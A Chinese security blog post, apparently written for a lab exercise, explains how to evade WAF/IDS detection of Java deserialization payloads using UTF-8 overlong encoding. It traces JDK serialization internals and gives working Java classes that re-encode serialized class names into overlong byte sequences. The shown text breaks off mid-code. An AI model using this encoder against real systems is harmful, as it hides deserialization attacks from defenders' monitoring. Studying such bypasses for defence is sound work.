---
title: "Java反序列化绕WAF"
date: 2025-04-19T20:49:33+08:00
lastmod: 2025-04-19T20:49:33+08:00
draft: false
keywords: []
description: ""
tags: ["java","waf"]
categories: ["Java"]
author: "w0s1np"

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: true
toc: true
autoCollapseToc: false
postMetaInFooter: false
hiddenFromHomePage: false
# You can also define another contentCopyright. e.g. contentCopyright: "This is another copyright."
contentCopyright: false
reward: false
mathjax: false
mathjaxEnableSingleDollar: false
mathjaxEnableAutoNumber: false

# You unlisted posts you might want not want the header or footer to show
hideHeaderAndFooter: false

# You can enable or disable out-of-date content warning for individual post.
# Comment this out to use the global config.
#enableOutdatedInfoWarning: false

flowchartDiagrams:
  enable: true
  options: ""

sequenceDiagrams: 
  enable: true
  options: ""

---

<!--more-->
前段时间导师叫搭建一个漏洞环境, 然后以使用一些混淆手段以绕过IDS为目标, 就找了一个java反序列化的洞搭起来, 使用了下`UTF-8 Overlong Encoding`​就绕了, 然后又搭建了下雷池waf试了下, 因为java-chains上的混淆, 导致执行的命令还是没有完全混淆, 而且不太方便自定义修改, 故学了一下这个绕过方式

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192053608.png)

## UTF-8 Overlong Encoding原理

### UTF-8编码原理

`UTF-8`​可以将`unicode`​码表里的所有字符, 用某种计算方式转换成长度是1到4位字节的字符。

| First code point | Last code point |  Byte 1  |  Byte 2  |  Byte 3  |  Byte 4  |
| :--------------: | :-------------: | :------: | :------: | :------: | :------: |
|      U+0000      |     U+007F      | 0xxxxxxx |          |          |          |
|      U+0080      |     U+07FF      | 110xxxxx | 10xxxxxx |          |          |
|      U+0800      |     U+FFFF      | 1110xxxx | 10xxxxxx | 10xxxxxx |          |
|     U+10000      |    U+10FFFF     | 11110xxx | 10xxxxxx | 10xxxxxx | 10xxxxxx |

即`[U+0000, U+007F]`​转换为1字节, `[U+0080, U+07FF]`​转换为2字节, 以此类推

例如欧元符号`€`​的unicode编码是`U+20AC`​

1. 那么就可以知道他转换后的字节长度为3
2. `0x20AC`​的二进制是`10 0000 1010 1100`​，将所有位数从左至右按照4、6、6分成三组, 第一组长度不满4前面补0：`0010，000010，101100`​
3. 分别给这三组增加前缀`1110、10`​和`10`​, 结果是`11100010、10000010、10101100`​, 对应的就是`\xE2\x82\xAC`​
4. `\xE2\x82\xAC`即为欧元符号`€`​的UTF-8编码

### Overlong Encoding原理

`Overlong Encoding`​就是将1个字节的字符, 按照UTF-8编码方式强行编码成2位以上UTF-8字符的方法。

例如p神举的例子` . `​其unicode编码和ascii编码一致, 均为0x2E。按照上表, 它只能被编码成单字节的UTF-8字符, 但我按照下面的方法进行转换：

1. `0x2E`​的二进制是`10 1110`​, 我给其前面补5个0, 变成`000 0010 1110`​
2. 将其分成5位、6位两组：`00000`​, `101110`​
3. 分别给这两组增加前缀`110`​, `10`​, 结果是`11000000`​, `10101110`​, 对应的是`\xC0\xAE`​

**​`0xC0AE`​**​**并不是一个合法的UTF-8字符, 但我们确实是按照UTF-8编码方式将其转换出来的**, 这就是UTF-8设计中的一个缺陷。

`UTF-8 Overlong Encoding`​在java反序列化中的应用, 正是因为在序列化和反序列化的时候, 都支持把unicode字符转换为2、3字节的UTF-8编码, 从而让我们生成的序列化字符为乱码, 但是当反序列化的时候能正常通过UTF-8机制还原为正常的unicode字符

## readObject UTF-8

@1ue 师傅给的调用栈

```Java
ObjectStreamClass#readNonProxy(ObjectInputStream in)
-> ObjectInputStream#readUTF()
    -> BlockDataInputStream#readUTF()
        -> ObjectInputStream#readUTFBody(long utflen)
            -> ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)
```

在之前跟着1ue师傅去调试了下jdk原生序列化与反序列化的过程的时候, 我们就已经知道, 在这过程中一个比较常用到的就是desc(类描述符), 他可以帮助我们获取目标类的类名、是否需要执行自定义序列化与反序列化操作、方便我们找到并实例化该class

因为序列化一个很明显的点就是, 类名是可见的, 那么流量检测只需要检测对应关键字即可, 猜测师傅应该就是去看了下java是如何获取类名, 从而发现这个utf8的转换机制的

所以我们就从获取desc的地方进去调试即可

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192053657.png)

前文是分析过这里的, 就是从序列化流中去读取对应的desc, 后面就可以找到获取类名的地方:

```java
private long readUTFSpan(StringBuilder sbuf, long utflen)
            throws IOException
        {
            int cpos = 0;
            int start = pos;
            int avail = Math.min(end - pos, CHAR_BUF_SIZE);
            // stop short of last char unless all of utf bytes in buffer
            int stop = pos + ((utflen > avail) ? avail - 2 : (int) utflen);
            boolean outOfBounds = false;

            try {
                while (pos < stop) {
                    int b1, b2, b3;
					// 通过 & 0xFF, 获取最低的8位
                    b1 = buf[pos++] & 0xFF;
					// 获取8位中的最高4位, 如果是0开头(这样才能进入case7), 就对应总的8位是小于128, 所以对应一个字节;
					// 如果8位中的最高4位是1100、223, 则进入case12、13, 对应总的8位就是最小是192, 最大是223, 这样就能进入两个字节的操作
					// 1110则进入三字节, 对应总的8位就是最小为224
                    switch (b1 >> 4) {
                        case 0:
                        case 1:
                        case 2:
                        case 3:
                        case 4:
                        case 5:
                        case 6:
                        case 7:   // 1 byte format: 0xxxxxxx
                            cbuf[cpos++] = (char) b1;
                            break;

                        case 12:
                        case 13:  // 2 byte format: 110xxxxx 10xxxxxx
                            b2 = buf[pos++];
							// 为了让第数字的范围在(128, 192)
                            if ((b2 & 0xC0) != 0x80) {
                                throw new UTFDataFormatException();
                            }
                            cbuf[cpos++] = (char) (((b1 & 0x1F) << 6) |
                                                   ((b2 & 0x3F) << 0));
                            break;

                        case 14:  // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx
                            b3 = buf[pos + 1];
                            b2 = buf[pos + 0];
                            pos += 2;
                            if ((b2 & 0xC0) != 0x80 || (b3 & 0xC0) != 0x80) {
                                throw new UTFDataFormatException();
                            }
                            cbuf[cpos++] = (char) (((b1 & 0x0F) << 12) |
                                                   ((b2 & 0x3F) << 6) |
                                                   ((b3 & 0x3F) << 0));
                            break;

                        default:  // 10xx xxxx, 1111 xxxx
                            throw new UTFDataFormatException();
                    }
                }
            } catch (ArrayIndexOutOfBoundsException ex) {
                outOfBounds = true;
            } finally {
                if (outOfBounds || (pos - start) > utflen) {
                    pos = start + (int) utflen;
                    throw new UTFDataFormatException();
                }
            }

            sbuf.append(cbuf, 0, cpos);
            return pos - start;
        }
```

那么此时, 我们可以把开始的o字符(对应111), 转换为两个数字分别为193、175, 这样就可以获取我们想得到的字符 o

```java
package com.example.waf.utf8;

public class testByte {
    public static void main(String[] args) {
        System.out.println((char) 111);
        int b1 = 0xc1;
        b1 = b1 & 0xFF;
        System.out.println(b1);
        System.out.println("b1 >> 4: "+(b1 >> 4));
        System.out.println((char) b1);
        int b2 = 0xaf;
        System.out.println(b2);
        System.out.println((b2 & 0xC0) != 0x80);
        System.out.println((char) (((b1 & 0x1F) << 6) |
                ((b2 & 0x3F) << 0)));
    }
}

```

那么原始序列化中的o(111), 就可以替换为这两个(193, 175)不可见的unicode字符

例如:

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192053461.png)

这是正常的序列化数据

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192053726.png)

改为对应的两个字节的数据, 这样在传输中就是乱码的, 最后却能在反序列化的时候还原为我们需要的字符o

## writeObject UTF-8

上面是通过非法UTF8字符转换为我们需要的字符, 现在就要看, 如何把正常的字符, 在序列化的过程中合理的转换为2字节的非法字符

稍微调试一下就知道在什么地方写入类名的:

```java
writeBytes:1975, ObjectOutputStream$BlockDataOutputStream (java.io)
writeUTF:2168, ObjectOutputStream$BlockDataOutputStream (java.io)
writeUTF:2007, ObjectOutputStream$BlockDataOutputStream (java.io)
writeUTF:869, ObjectOutputStream (java.io)
writeNonProxy:721, ObjectStreamClass (java.io)
writeClassDescriptor:668, ObjectOutputStream (java.io)
writeNonProxyDesc:1282, ObjectOutputStream (java.io)
writeClassDesc:1231, ObjectOutputStream (java.io)
writeOrdinaryObject:1427, ObjectOutputStream (java.io)
writeObject0:1178, ObjectOutputStream (java.io)
writeObject:348, ObjectOutputStream (java.io)
main:13, test (com.example.waf.utf8)
```

但是这里需要对于如何处理1字节和多字节使用一个判断分支的:

```java
        long getUTFLength(String s) {
            int len = s.length();
            long utflen = 0;
            for (int off = 0; off < len; ) {
                int csize = Math.min(len - off, CHAR_BUF_SIZE);
                s.getChars(off, off + csize, cbuf, 0);
                for (int cpos = 0; cpos < csize; cpos++) {
                    char c = cbuf[cpos];
                    if (c >= 0x0001 && c <= 0x007F) {
                        utflen++;
                    } else if (c > 0x07FF) {
                        utflen += 3;
                    } else {
                        utflen += 2;
                    }
                }
                off += csize;
            }
            return utflen;
        }

        void writeUTF(String s, long utflen) throws IOException {
            if (utflen > 0xFFFFL) {
                throw new UTFDataFormatException();
            }
            writeShort((int) utflen);
            if (utflen == (long) s.length()) {
                writeBytes(s);
            } else {
                writeUTFBody(s);
            }
        }
```

首先会根据类名获取到对应的utf8字符的长度, 然后再在`writeUTF`​进入对应的分支, 那么我们想让它进入`writeUTFBody(s);`​, 就必须要修改`utflen`​, 这里先不管, 往后看

```java
        private void writeUTFBody(String s) throws IOException {
			// 1024 -3
            int limit = MAX_BLOCK_SIZE - 3;
			// 25
            int len = s.length();
            for (int off = 0; off < len; ) {
                int csize = Math.min(len - off, CHAR_BUF_SIZE);	// 最大为256
                s.getChars(off, off + csize, cbuf, 0);		// 把s写入缓冲区	
				// 根据字符的值选择合适的 UTF 编码方式
                for (int cpos = 0; cpos < csize; cpos++) {
                    char c = cbuf[cpos];
                    if (pos <= limit) {
                        if (c <= 0x007F && c != 0) {
                            buf[pos++] = (byte) c;
                        } else if (c > 0x07FF) {
                            buf[pos + 2] = (byte) (0x80 | ((c >> 0) & 0x3F));
                            buf[pos + 1] = (byte) (0x80 | ((c >> 6) & 0x3F));
                            buf[pos + 0] = (byte) (0xE0 | ((c >> 12) & 0x0F));
                            pos += 3;
                        } else {
                            buf[pos + 1] = (byte) (0x80 | ((c >> 0) & 0x3F));
                            buf[pos + 0] = (byte) (0xC0 | ((c >> 6) & 0x1F));
                            pos += 2;
                        }
						// 如果缓冲区满了（pos > limit），则调用 write 方法逐字节写入
                    } else {    // write one byte at a time to normalize block
                        if (c <= 0x007F && c != 0) {
                            write(c);
                        } else if (c > 0x07FF) {
                            write(0xE0 | ((c >> 12) & 0x0F));
                            write(0x80 | ((c >> 6) & 0x3F));
                            write(0x80 | ((c >> 0) & 0x3F));
                        } else {
                            write(0xC0 | ((c >> 6) & 0x1F));
                            write(0x80 | ((c >> 0) & 0x3F));
                        }
                    }
                }
                off += csize;
            }
        }
    }
```

验证一下:

```java
package com.example.waf.utf8;

public class testByte {
    public static void main(String[] args) {
        char c = 'o';
        System.out.println((char) c);
        byte[] buf = new byte[1024];
        buf[0] = (byte) (0x80 | ((c >> 0) & 0x3F));
        buf[1] = (byte) (0xC0 | ((c >> 6) & 0x1F));
        System.out.println(buf[0]+"\n"+buf[1]);

        int b1 = buf[0] & 0xFF;
        int b2 = buf[1];
        System.out.println((b2 & 0xC0) != 0x80);
        char result = (char) (((b1 & 0x1F) << 6) |
                ((b2 & 0x3F) << 0));
        System.out.println(result);
    }
}

o
-81
-63
true
ρ
```

出现了负数, 而且好像还原后也不是o了, 那么我们需要修改`writeUTFBody`​方法, 让其能转为我们想要的`193、175`​

```java
        buf[0] = (byte) (0xC0 | ((c >> 6) & 0x1F));
        buf[1] = (byte) (0x80 | ((c >> 0) & 0x3F));
        System.out.println(buf[0] + "\n" + buf[1]);
```

如果在write的时候能重写为上面的格式就可以到达我们的目的

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192054268.png)

但是`writeUTFBody`​是`ObjectOutputStream`​子类的`private`​方法, 我们是通过重写来执行到我们的`writeUTFBody`​方法, 但是我实验之后, 在`myObjectOutputStream`​写入的buf和后面实际写入的东西是不一致的

我们看到`writeUTFBody`​ if会判断范围然后进行对应byte的编码, 然后注意下这里数据少（<1024）的时候不会执行下方else中`write()`​方法, 哪里会进行写入呢, 我们根据调用栈往上查找

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192054249.png)

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192054778.png)

`writeClassDescriptor(desc);`​就是上面执行写入 buf 的操作,而`bout.setBlockDataMode(true);`​里的`drain()`​函数才是真正写入数据的时候

所以如果你只是通过重写`writeUTFBody`​然后控制的buf, 实际上当跳到`BlockDataOutputStream#drain`​方法的时候, 这两个不是同一个buf, 你的目的是要控制`BlockDataOutputStream`​里面的buf

### drain

```java
        void drain() throws IOException {
            if (pos == 0) {
                return;
            }
            if (blkmode) {
                writeBlockHeader(pos);
            }
            out.write(buf, 0, pos);
            pos = 0;
        }
```

这里的buf如果我们可控, 那么就可以

我们回想到`writeUTFBody`​中下面一个else里不是有write操作么？

```java
if (pos <= limit) {
    if (c <= 0x007F && c != 0) {
        buf[pos++] = (byte) c;
    } else if (c > 0x07FF) {
        buf[pos + 2] = (byte) (0x80 | ((c >> 0) & 0x3F));
        buf[pos + 1] = (byte) (0x80 | ((c >> 6) & 0x3F));
        buf[pos + 0] = (byte) (0xE0 | ((c >> 12) & 0x0F));
        pos += 3;
    } else {
        buf[pos + 1] = (byte) (0x80 | ((c >> 0) & 0x3F));
        buf[pos + 0] = (byte) (0xC0 | ((c >> 6) & 0x1F));
        pos += 2;
    }
} else {    // write one byte at a time to normalize block
    if (c <= 0x007F && c != 0) {
        write(c);
    } else if (c > 0x07FF) {
        write(0xE0 | ((c >> 12) & 0x0F));
        write(0x80 | ((c >> 6) & 0x3F));
        write(0x80 | ((c >> 0) & 0x3F));
    } else {
        write(0xC0 | ((c >> 6) & 0x1F));
        write(0x80 | ((c >> 0) & 0x3F));
    }
}
```

我们可以看到超过limit会进入到这个else, `limit`​是1204-3, 我们看看write干了啥

```java
        public void write(int b) throws IOException {
            if (pos >= MAX_BLOCK_SIZE) {
                drain();
            }
            buf[pos++] = (byte) b;
        }
```

可以发现这里调用到了`BlockDataOutputStream`​里的write, 而且往buf里面写入了我们可控的b, 如果我们让`writeUTFBody`​进入else中的`write`​两字节, 那么就可以跳到`BlockDataOutputStream`​里的wirte然后控制`buf`​

当然, 这里的`writeUTFBody`​是我们重写的`myObjectOutputStream`​, 但是我们不写write方法, 他就会找父类的wirte方法:

```java
    public void write(int val) throws IOException {
        bout.write(val);
    }
```

这个是`ObjectOutputStream`​的`public`​方法, 那么这样就可以跳到`BlockDataOutputStream`​的write方法了, 这样就可以控制buf

## poc1

```java
myObjectOutputStream#writeUTFBody	->
	ObjectOutputStream#write	->
		BlockDataOutputStream#write	->	这里可以控制buf
```

注意需要把`小于7F`​的范围改成, `c <= 0x0020 && c != 0`​, 20对应的是32, 空白符就1byte的格式, 大于32的就采用`2byte`​

```java
package com.example.waf.utf8;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.io.UTFDataFormatException;

public class myObjectOutputStream extends ObjectOutputStream {

    private static final int MAX_BLOCK_SIZE = 1024;
    /** maximum data block header length */
    private final char[] cbuf = new char[CHAR_BUF_SIZE];
    /** (tunable) length of char buffer (for writing strings) */
    private static final int CHAR_BUF_SIZE = 256;
    private int pos = 0;
    private final byte[] buf = new byte[MAX_BLOCK_SIZE];

    public myObjectOutputStream(OutputStream out) throws IOException {
        super(out);
    }
    public void writeUTF(String s) throws IOException {
        writeUTF(s, getUTFLength(s));
    }

    void writeUTF(String s, long utflen) throws IOException {
        if (utflen > 0xFFFFL) {
            throw new UTFDataFormatException();
        }
        writeShort((int) utflen);
        if (utflen == (long) s.length()) {
            writeBytes(s);
        } else {
            writeUTFBody(s);
        }
    }

    private void writeUTFBody(String s) throws IOException {
        int limit = MAX_BLOCK_SIZE - 3;
        int len = s.length();
        for (int off = 0; off < len; ) {
            int csize = Math.min(len - off, CHAR_BUF_SIZE);
            s.getChars(off, off + csize, cbuf, 0);
            for (int cpos = 0; cpos < csize; cpos++) {
                char c = cbuf[cpos];
//                if (pos <= limit) {
//                    if (c <= 0x0020 && c != 0) {
//                        buf[pos++] = (byte) c;
//                    } else if (c > 0x07FF) {
//                        buf[pos + 2] = (byte) (0x80 | ((c >> 0) & 0x3F));
//                        buf[pos + 1] = (byte) (0x80 | ((c >> 6) & 0x3F));
//                        buf[pos + 0] = (byte) (0xE0 | ((c >> 12) & 0x0F));
//                        pos += 3;
//                    } else {
//                        buf[pos + 1] = (byte) (0x80 | ((c >> 0) & 0x3F));
//                        buf[pos + 0] = (byte) (0xC0 | ((c >> 6) & 0x1F));
//                        pos += 2;
//                    }
//                } else {    // write one byte at a time to normalize block
                if (c <= 0x0020 && c != 0) {
                    write(c);
                } else if (c > 0x07FF) {
                    write(0xE0 | ((c >> 12) & 0x0F));
                    write(0x80 | ((c >> 6) & 0x3F));
                    write(0x80 | ((c >> 0) & 0x3F));
                } else {
                    write(0xC0 | ((c >> 6) & 0x1F));
                    write(0x80 | ((c >> 0) & 0x3F));
                }
//                }
            }
            off += csize;
        }
    }


    long getUTFLength(String s) {
        int len = s.length();
        long utflen = 0;
        for (int off = 0; off < len; ) {
            int csize = Math.min(len - off, CHAR_BUF_SIZE);
            s.getChars(off, off + csize, cbuf, 0);
            for (int cpos = 0; cpos < csize; cpos++) {
                char c = cbuf[cpos];
                if (c >= 0x0001 && c <= 0x0020) {
                    utflen++;
                } else if (c > 0x07FF) {
                    utflen += 3;
                } else {
                    utflen += 2;
                }
            }
            off += csize;
        }
        return utflen;
    }

}
```

![image](https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202504192054591.png)

## poc2

直接在写入name的时候, 重写部分方法, 在进行utf-8转换之前, 就把name改为2字节或者3字节

分别在`ObjectOutputStream#writeClassDescriptor`​或者`ObjectOutputStream#writeUTF`​进行重写

```java
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
/**
 * 参考p神：https://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg
 * 参考1ue：https://t.zsxq.com/17LkqCzk8
 * 实现：参考 OObjectOutputStream# protected void writeClassDescriptor(ObjectStreamClass desc)方法
 */
public class CustomObjectOutputStream extends ObjectOutputStream {

    public CustomObjectOutputStream(OutputStream out) throws IOException {
        super(out);
    }

    private static HashMap<Character, int[]> map;
    private static Map<Character,int[]> bytesMap=new HashMap<>();

    static {
        map = new HashMap<>();
        map.put('.', new int[]{0xc0, 0xae});
        map.put(';', new int[]{0xc0, 0xbb});
        map.put('$', new int[]{0xc0, 0xa4});
        map.put('[', new int[]{0xc1, 0x9b});
        map.put(']', new int[]{0xc1, 0x9d});
        map.put('a', new int[]{0xc1, 0xa1});
        map.put('b', new int[]{0xc1, 0xa2});
        map.put('c', new int[]{0xc1, 0xa3});
        map.put('d', new int[]{0xc1, 0xa4});
        map.put('e', new int[]{0xc1, 0xa5});
        map.put('f', new int[]{0xc1, 0xa6});
        map.put('g', new int[]{0xc1, 0xa7});
        map.put('h', new int[]{0xc1, 0xa8});
        map.put('i', new int[]{0xc1, 0xa9});
        map.put('j', new int[]{0xc1, 0xaa});
        map.put('k', new int[]{0xc1, 0xab});
        map.put('l', new int[]{0xc1, 0xac});
        map.put('m', new int[]{0xc1, 0xad});
        map.put('n', new int[]{0xc1, 0xae});
        map.put('o', new int[]{0xc1, 0xaf});
        map.put('p', new int[]{0xc1, 0xb0});
        map.put('q', new int[]{0xc1, 0xb1});
        map.put('r', new int[]{0xc1, 0xb2});
        map.put('s', new int[]{0xc1, 0xb3});
        map.put('t', new int[]{0xc1, 0xb4});
        map.put('u', new int[]{0xc1, 0xb5});
        map.put('v', new int[]{0xc1, 0xb6});
        map.put('w', new int[]{0xc1, 0xb7});
        map.put('x', new int[]{0xc1, 0xb8});
        map.put('y', new int[]{0xc1, 0xb9});
        map.put('z', new int[]{0xc1, 0xba});
        map.put('A', new int[]{0xc1, 0x81});
        map.put('B', new int[]{0xc1, 0x82});
        map.put('C', new int[]{0xc1, 0x83});
        map.put('D', new int[]{0xc1, 0x84});
        map.put('E', new int[]{0xc1, 0x85});
        map.put('F', new int[]{0xc1, 0x86});
        map.put('G', new int[]{0xc1, 0x87});
        map.put('H', new int[]{0xc1, 0x88});
        map.put('I', new int[]{0xc1, 0x89});
        map.put('J', new int[]{0xc1, 0x8a});
        map.put('K', new int[]{0xc1, 0x8b});
        map.put('L', new int[]{0xc1, 0x8c});
        map.put('M', new int[]{0xc1, 0x8d});
        map.put('N', new int[]{0xc1, 0x8e});
        map.put('O', new int[]{0xc1, 0x8f});
        map.put('P', new int[]{0xc1, 0x90});
        map.put('Q', new int[]{0xc1, 0x91});
        map.put('R', new int[]{0xc1, 0x92});
        map.put('S', new int[]{0xc1, 0x93});
        map.put('T', new int[]{0xc1, 0x94});
        map.put('U', new int[]{0xc1, 0x95});
        map.put('V', new int[]{0xc1, 0x96});
        map.put('W', new int[]{0xc1, 0x97});
        map.put('X', new int[]{0xc1, 0x98});
        map.put('Y', new int[]{0xc1, 0x99});
        map.put('Z', new int[]{0xc1, 0x9a});


        bytesMap.put('$', new int[]{0xe0,0x80,0xa4});
        bytesMap.put('.', new int[]{0xe0,0x80,0xae});
        bytesMap.put(';', new int[]{0xe0,0x80,0xbb});
        bytesMap.put('A', new int[]{0xe0,0x81,0x81});
        bytesMap.put('B', new int[]{0xe0,0x81,0x82});
        bytesMap.put('C', new int[]{0xe0,0x81,0x83});
        bytesMap.put('D', new int[]{0xe0,0x81,0x84});
        bytesMap.put('E', new int[]{0xe0,0x81,0x85});
        bytesMap.put('F', new int[]{0xe0,0x81,0x86});
        bytesMap.put('G', new int[]{0xe0,0x81,0x87});
        bytesMap.put('H', new int[]{0xe0,0x81,0x88});
        bytesMap.put('I', new int[]{0xe0,0x81,0x89});
        bytesMap.put('J', new int[]{0xe0,0x81,0x8a});
        bytesMap.put('K', new int[]{0xe0,0x81,0x8b});
        bytesMap.put('L', new int[]{0xe0,0x81,0x8c});
        bytesMap.put('M', new int[]{0xe0,0x81,0x8d});
        bytesMap.put('N', new int[]{0xe0,0x81,0x8e});
        bytesMap.put('O', new int[]{0xe0,0x81,0x8f});
        bytesMap.put('P', new int[]{0xe0,0x81,0x90});
        bytesMap.put('Q', new int[]{0xe0,0x81,0x91});
        bytesMap.put('R', new int[]{0xe0,0x81,0x92});
        bytesMap.put('S', new int[]{0xe0,0x81,0x93});
        bytesMap.put('T', new int[]{0xe0,0x81,0x94});
        bytesMap.put('U', new int[]{0xe0,0x81,0x95});
        bytesMap.put('V', new int[]{0xe0,0x81,0x96});
        bytesMap.put('W', new int[]{0xe0,0x81,0x97});
        bytesMap.put('X', new int[]{0xe0,0x81,0x98});
        bytesMap.put('Y', new int[]{0xe0,0x81,0x99});
        bytesMap.put('Z', new int[]{0xe0,0x81,0x9a});
        bytesMap.put('[', new int[]{0xe0,0x81,0x9b});
        bytesMap.put(']', new int[]{0xe0,0x81,0x9d});
        bytesMap.put('a', new int[]{0xe0,0x81,0xa1});
        bytesMap.put('b', new int[]{0xe0,0x81,0xa2});
        bytesMap.put('c', new int[]{0xe0,0x81,0xa3});
        bytesMap.put('d', new int[]{0xe0,0x81,0xa4});
        bytesMap.put('e', new int[]{0xe0,0x81,0xa5});
        bytesMap.put('f', new int[]{0xe0,0x81,0xa6});
        bytesMap.put('g', new int[]{0xe0,0x81,0xa7});
        bytesMap.put('h', new int[]{0xe0,0x81,0xa8});
        bytesMap.put('i', new int[]{0xe0,0x81,0xa9});
        bytesMap.put('j', new int[]{0xe0,0x81,0xaa});
        bytesMap.put('k', new int[]{0xe0,0x81,0xab});
        bytesMap.put('l', new int[]{0xe0,0x81,0xac});
        bytesMap.put('m', new int[]{0xe0,0x81,0xad});
        bytesMap.put('n', new int[]{0xe0,0x81,0xae});
        bytesMap.put('o', new int[]{0xe0,0x81,0xaf});
        bytesMap.put('p', new int[]{0xe0,0x81,0xb0});
        bytesMap.put('q', new int[]{0xe0,0x81,0xb1});
        bytesMap.put('r', new int[]{0xe0,0x81,0xb2});
        bytesMap.put('s', new int[]{0xe0,0x81,0xb3});
        bytesMap.put('t', new int[]{0xe0,0x81,0xb4});
        bytesMap.put('u', new int[]{0xe0,0x81,0xb5});
        bytesMap.put('v', new int[]{0xe0,0x81,0xb6});
        bytesMap.put('w', new int[]{0xe0,0x81,0xb7});
        bytesMap.put('x', new int[]{0xe0,0x81,0xb8});
        bytesMap.put('y', new int[]{0xe0,0x81,0xb9});
        bytesMap.put('z', new int[]{0xe0,0x81,0xba});

    }



    public void charWritTwoBytes(String name){
        //将name进行overlong Encoding
        byte[] bytes=new byte[name.length() * 2];
        int k=0;
        StringBuffer str=new StringBuffer();
        for (int i = 0; i < name.length(); i++) {
            int[] bs = map.get(name.charAt(i));
            bytes[k++]= (byte) bs[0];
            bytes[k++]= (byte) bs[1];
            str.append(Integer.toHexString(bs[0])+",");
            str.append(Integer.toHexString(bs[1])+",");
        }
        System.out.println(str.toString());
        try {
            writeShort(name.length() * 2);
            write(bytes);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
    public void charWriteThreeBytes(String name){
        //将name进行overlong Encoding
        byte[] bytes=new byte[name.length() * 3];
        int k=0;
        StringBuffer str=new StringBuffer();
        for (int i = 0; i < name.length(); i++) {
            int[] bs = bytesMap.get(name.charAt(i));
            bytes[k++]= (byte) bs[0];
            bytes[k++]= (byte) bs[1];
            bytes[k++]= (byte) bs[2];
            str.append(Integer.toHexString(bs[0])+",");
            str.append(Integer.toHexString(bs[1])+",");
            str.append(Integer.toHexString(bs[2])+",");
        }
        System.out.println(str.toString());
        try {
            writeShort(name.length() * 3);
            write(bytes);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }


    protected void writeClassDescriptor(ObjectStreamClass desc)
            throws IOException {
        String name = desc.getName();
        boolean externalizable = (boolean) getFieldValue(desc, "externalizable");
        boolean serializable = (boolean) getFieldValue(desc, "serializable");
        boolean hasWriteObjectData = (boolean) getFieldValue(desc, "hasWriteObjectData");
        boolean isEnum = (boolean) getFieldValue(desc, "isEnum");
        ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, "fields");
        System.out.println(name);
        //写入name（jdk原生写入方法）
//        writeUTF(name);
        //写入name(两个字节表示一个字符)
//        charWritTwoBytes(name);
        //写入name(三个字节表示一个字符)
        charWriteThreeBytes(name);


        writeLong(desc.getSerialVersionUID());
        byte flags = 0;
        if (externalizable) {
            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;
            Field protocolField =
                    null;
            int protocol;
            try {
                protocolField = ObjectOutputStream.class.getDeclaredField("protocol");
                protocolField.setAccessible(true);
                protocol = (int) protocolField.get(this);
            } catch (NoSuchFieldException e) {
                throw new RuntimeException(e);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            }
            if (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) {
                flags |= ObjectStreamConstants.SC_BLOCK_DATA;
            }
        } else if (serializable) {
            flags |= ObjectStreamConstants.SC_SERIALIZABLE;
        }
        if (hasWriteObjectData) {
            flags |= ObjectStreamConstants.SC_WRITE_METHOD;
        }
        if (isEnum) {
            flags |= ObjectStreamConstants.SC_ENUM;
        }
        writeByte(flags);

        writeShort(fields.length);
        for (int i = 0; i < fields.length; i++) {
            ObjectStreamField f = fields[i];
            writeByte(f.getTypeCode());
            writeUTF(f.getName());
            if (!f.isPrimitive()) {
                invoke(this, "writeTypeString", f.getTypeString());
            }
        }
    }

    public static void invoke(Object object, String methodName, Object... args) {
        Method writeTypeString = null;
        try {
            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);
            writeTypeString.setAccessible(true);
            try {
                writeTypeString.invoke(object, args);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            } catch (InvocationTargetException e) {
                throw new RuntimeException(e);
            }
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
    }

    public static Object getFieldValue(Object object, String fieldName) {
        Class<?> clazz = object.getClass();
        Field field = null;
        Object value = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
            value = field.get(object);
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        return value;
    }
}
```

```java
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.util.HashMap;

public class OverlongExp extends ObjectOutputStream {

    private static HashMap<Character, int[]> map;
    static {
        map = new HashMap<>();
        map.put('.', new int[]{0xc0, 0xae});
        map.put(';', new int[]{0xc0, 0xbb});
        map.put('$', new int[]{0xc0, 0xa4});
        map.put('[', new int[]{0xc1, 0x9b});
        map.put(']', new int[]{0xc1, 0x9d});
        map.put('_', new int[]{0xc1, 0x9f});
        map.put('a', new int[]{0xc1, 0xa1});
        map.put('b', new int[]{0xc1, 0xa2});
        map.put('c', new int[]{0xc1, 0xa3});
        map.put('d', new int[]{0xc1, 0xa4});
        map.put('e', new int[]{0xc1, 0xa5});
        map.put('f', new int[]{0xc1, 0xa6});
        map.put('g', new int[]{0xc1, 0xa7});
        map.put('h', new int[]{0xc1, 0xa8});
        map.put('i', new int[]{0xc1, 0xa9});
        map.put('j', new int[]{0xc1, 0xaa});
        map.put('k', new int[]{0xc1, 0xab});
        map.put('l', new int[]{0xc1, 0xac});
        map.put('m', new int[]{0xc1, 0xad});
        map.put('n', new int[]{0xc1, 0xae});
        map.put('o', new int[]{0xc1, 0xaf});
        map.put('p', new int[]{0xc1, 0xb0});
